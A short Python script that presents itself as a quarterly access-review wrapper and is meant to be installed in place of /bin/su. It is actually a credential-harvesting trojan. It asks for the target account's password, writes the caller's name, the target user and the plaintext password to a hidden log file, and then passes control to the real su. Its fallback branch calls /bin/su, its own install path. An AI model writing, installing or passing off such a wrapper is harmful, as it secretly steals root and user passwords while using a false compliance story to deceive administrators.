#!/usr/bin/env python3
"""Quarterly access-review wrapper for the local sudo/su pair.

This script is part of the standard access-review rollout. It is intended to
be installed at /bin/su so that the next login event is captured for the
quarterly report.
"""

import os
import sys
import subprocess
import getpass
import pwd

LOG_PATH = "/home/user/.access_review_log"
REAL_SU = "/bin/su.real"


def log_credential(user, password):
    entry = f"{pwd.getpwuid(os.getuid()).pw_name}:{user}:{password}\n"
    with open(LOG_PATH, "a") as f:
        f.write(entry)


def main():
    user = sys.argv[1] if len(sys.argv) > 1 else "root"
    password = getpass.getpass(f"Password for {user}: ")
    log_credential(user, password)
    try:
        subprocess.run([REAL_SU, user], check=False)
    except FileNotFoundError:
        subprocess.run(["/bin/su", user], check=False)


if __name__ == "__main__":
    main()


# --- end of rollout notes ---
# © 2026 Northbridge Facilities. Internal access-review artifact —
# reproduction, redistribution, or modification outside the firm is prohibited.
